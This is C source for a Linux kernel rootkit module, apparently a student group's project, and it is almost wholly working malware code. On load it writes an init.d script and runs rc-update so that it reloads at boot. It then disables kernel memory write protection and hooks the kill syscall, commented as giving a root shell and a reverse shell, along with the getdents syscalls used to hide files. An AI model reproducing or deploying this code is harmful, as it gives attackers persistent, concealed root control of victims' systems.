#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/unistd.h>
#include <linux/cred.h>
#include <linux/types.h>

#include <linux/string.h>

#include <asm/special_insns.h>
#include <asm/processor-flags.h>


#include "to_root.h"
#include "revshell.h"
#include "utils.h"
#include "hideme.h"

#define FILE_PATH "/etc/init.d/hideme.load_LKM"
#define DATA_TO_WRITE "#!/sbin/openrc-run\n\ndepend(){\n\tneed root\n}\n\nstart(){\n\tinsmod /root/hideme.rootkit.ko\n}\n"

//syscall table adr
uint64_t *syscall_table = 0;

int __init rootkit_init(void){
    struct file *file;
    char *argv1[] = { "/bin/chmod", "755", FILE_PATH, NULL };
    char *envp1[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    char *argv2[] = { "/sbin/rc-update", "add", FILE_PATH, "default", NULL };
    char *envp2[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    char *argv3[] = { "/bin/mv", "/root/rootkit.ko", "/root/hideme.rootkit.ko", NULL };
    char *envp3[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    unsigned long save_memory;
    loff_t pos;

    //write file for init.d
    file = filp_open(FILE_PATH, O_WRONLY | O_CREAT, 0644);
    pos = file->f_pos = 0;
    kernel_write(file, DATA_TO_WRITE, sizeof(DATA_TO_WRITE) - 1, &pos);
    filp_close(file, NULL);

    //exec command for persistence with init.d
    call_usermodehelper(argv1[0], argv1, envp1, UMH_WAIT_EXEC);
    call_usermodehelper(argv2[0], argv2, envp2, UMH_WAIT_EXEC);
    call_usermodehelper(argv3[0], argv3, envp3, UMH_WAIT_EXEC);

    //get syscall table
    syscall_table = get_syscall_table();

    //unprotect memory
    save_memory = unprotect_memory();

    //hook syscall kill for root shell and revshell
    original_kill = (sysfun_t) syscall_table[__NR_kill];
    syscall_table[__NR_kill] = (uint64_t) kill_hook;

    //hook getdents & getdents64
    orig_getdents = (long int (*)(const struct pt_regs *)) syscall_table[__NR_getdents];
    syscall_table[__NR_getdents] = (uint64_t) hook_getdents;

    orig_getdents64 = (long int (*)(const struct pt_regs *)) syscall_table[__NR_getdents64];
    syscall_table[__NR_getdents64] = (uint64_t) hook_getdents64;

    //protect memory
    protect_memory(save_memory);

    return 0;	
}


void __exit rootkit_exit(void){
    //unprotect memory
    unsigned long save_memory = unprotect_memory();	

    //unhook kill for root shell and revshell
    syscall_table[__NR_kill] = (uint64_t) original_kill;

    //unhook getdents & getdents64
    syscall_table[__NR_getdents] = (uint64_t) orig_getdents;
    syscall_table[__NR_getdents64] = (uint64_t) orig_getdents64;

    //protect memory
    protect_memory(save_memory);
}



MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Module rootkit");
MODULE_AUTHOR("Groupe 3");

module_init(rootkit_init);
module_exit(rootkit_exit);
